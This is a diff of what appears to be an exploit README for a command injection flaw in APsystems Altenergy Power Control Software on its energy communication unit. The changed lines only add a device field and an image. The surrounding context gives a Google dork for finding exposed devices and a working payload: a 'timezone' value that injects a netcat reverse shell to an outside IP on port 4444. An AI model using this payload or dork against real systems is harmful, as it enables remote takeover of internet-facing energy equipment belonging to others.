@@ -2,6 +2,9 @@
 ### SW ver : C1.2.5
 ### Vendor :  https://apsystems.com/
 ### Google Dork : intitle:"Altenergy Power Control Software"
+### Affected device : ENERGY COMMUNICATION UNIT
+![Alt Text](https://www.ecodirect.com/v/vspfiles/photos/APSYSTEMS-YC500-ECU-2T.jpg)
+
 
 ## vulnerable code :
 
@@ -70,6 +73,7 @@ timezone=`/bin/sh 0</tmp/backpipe | nc 156.197.154.12 4444 1>/tmp/backpipe`
 
 ```
 POC : 
+
 ![Alt Text](POC.png)
 
 ** note **
